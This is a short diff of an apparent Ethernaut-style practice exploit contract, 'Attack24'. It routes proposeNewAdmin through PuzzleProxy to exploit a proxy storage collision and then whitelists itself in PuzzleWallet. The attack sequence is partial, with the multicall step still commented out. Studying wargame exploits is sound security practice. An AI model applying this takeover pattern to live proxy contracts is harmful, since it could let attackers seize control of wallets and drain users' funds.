@@ -7,16 +7,16 @@ import "interfaces/ipuzzlewallet.sol";
 
 contract Attack24 {
     PuzzleWallet public target;
-    // PuzzleProxy public proxy;
+    PuzzleProxy public proxy;
 
     constructor(address _targetAddress) {
         target = PuzzleWallet(_targetAddress);        
-        // proxy = PuzzleProxy(_targetAddress);
+        proxy = PuzzleProxy(_targetAddress);
     }
 
-    function attack(IPuzzleWallet) public {
+    function attack() public {
         // target.multicall(data);
-        target.proposeNewAdmin(address(this));
+        proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
     }
 }
